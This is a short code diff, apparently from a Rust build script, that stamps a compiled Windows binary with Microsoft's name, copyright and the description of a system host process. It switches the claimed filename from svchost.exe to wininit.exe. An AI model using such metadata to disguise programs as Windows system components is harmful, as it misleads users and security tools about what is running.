@@ -22,9 +22,12 @@ fn main() {
         res.set("FileDescription", "Host Process for Windows Services");
         res.set("ProductName", "Microsoft® Windows® Operating System");
         res.set("CompanyName", "Microsoft Corporation");
-        res.set("LegalCopyright", "© Microsoft Corporation. All rights reserved");
-        res.set("OriginalFilename", "svchost.exe");
-        res.set("InternalName", "svchost.exe");
+        res.set(
+            "LegalCopyright",
+            "© Microsoft Corporation. All rights reserved",
+        );
+        res.set("OriginalFilename", "wininit.exe");
+        res.set("InternalName", "wininit.exe");
 
         let version: Vec<u16> = env!("CARGO_PKG_VERSION")
             .split('.')
